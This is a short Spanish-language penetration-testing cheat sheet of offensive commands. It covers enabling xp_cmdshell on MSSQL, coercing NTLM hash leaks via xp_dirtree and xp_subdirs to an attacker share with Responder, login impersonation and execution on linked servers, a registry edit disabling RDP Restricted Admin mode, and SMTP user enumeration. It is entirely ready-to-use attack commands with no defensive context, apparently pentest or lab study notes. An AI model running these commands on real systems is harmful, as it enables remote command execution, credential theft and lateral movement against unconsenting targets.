# Cheatsheet ⚙

## MSSQL 📄

| Cambiar Permisos Para Ejecutar Comandos 👩‍💻 |
|:---:|
| `sp_configure "show advanced option", 1` | 
| `RECONFIGURE` | 
| `sp_configure "xp_cmdshell", 1` | 
| `RECONFIGURE` | 

| Dumpeando Hashes 👩‍💻 |
|:---:|
| `responder -I [Interface]` | 
| `EXEC master..xp_subdirs '\\[IP]\[Directory]'` | 
| `EXEC master..xp_dirtree '\\[IP]\[Directory]'` | 

| Impersonar 🎭 |
|:---:|
| `EXECUTE AS LOGIN = '[Username]'` | 
| `SELECT srvname, isremote FROM sysservers;` | 
| `EXECUTE('[SENTENCIA SQL]') AT "[FULL NAME SERVER LINKED]"` | 


## RDP 💻
| Deshabilitar El Modo Restringido de Administrador 👩‍💻 |
|:---:|
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` |

## SMTP 📧
| Enumerar Usuarios SMTP 👩‍💻 |
|:---:|
| `smtp-user-enum -M RCPT -U [UserList.txt] -D [Domain] -t [IP]` |